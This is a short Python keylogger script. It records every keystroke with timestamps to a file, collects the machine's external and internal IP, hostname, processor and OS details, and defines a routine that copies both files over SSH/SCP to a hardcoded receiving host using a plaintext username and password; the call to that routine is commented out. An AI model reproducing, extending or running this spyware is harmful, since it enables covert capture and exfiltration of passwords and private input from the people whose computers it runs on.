#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pynput import keyboard
from time import ctime
import platform
import psutil
import socket
from urllib import request
from scp import SCPClient
from paramiko import SSHClient, AutoAddPolicy


def transferData(keys_file, data_file):
    receiver_ip = "192.168.1.23"
    receiver_username = "pi"
    receiver_password = "123"

    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())

    ssh.connect(receiver_ip, username=receiver_username, password=receiver_password)

    with SCPClient(ssh.get_transport()) as scp:
        scp.put(keys_file, 'gathered_keys.txt')
        scp.put(data_file, 'gathered_data.txt')
    ssh.close()

def getExternalIp():
    return request.urlopen('https://ident.me').read().decode('utf-8')

def getPcInformation():
    hostname = socket.gethostname()
    ipaddr = socket.gethostbyname(hostname)

    processor = platform.processor()
    system = platform.platform()
    machine = platform.machine()

    return hostname, ipaddr, processor, system, machine

def mainloop():
    with open("keys.txt", "a") as f:
        def on_press(key):
            if key == keyboard.Key.esc:
                # stop loop
                return False
            else:
                try:
                    print('writing key {} to log'.format(key.char))
                    f.write('{} pressed at {}\n'.format(key.char, ctime()))
                except AttributeError:
                    print('writing key {} to log'.format(key))
                    f.write('{} pressed at {}\n'.format(key, ctime()))

        # collect till stopped
        with keyboard.Listener(on_press=on_press) as listener:

            listener.join()
            f.close()
            # transferData("keys.txt", "data.txt")


def init():
    externalip = getExternalIp()
    hostname, internalip, processor, system, machine = getPcInformation()
    pcinfo = 'ExtIp: {}\nHost: {}\nIntIp: {}\nProc: {}\nSys: {}\nMach: {}'.format(externalip, hostname, internalip, processor, system, machine)
    with open("data.txt", "w") as f:
        f.write(pcinfo)
        f.close()
    mainloop()

if __name__ == "__main__":
    init()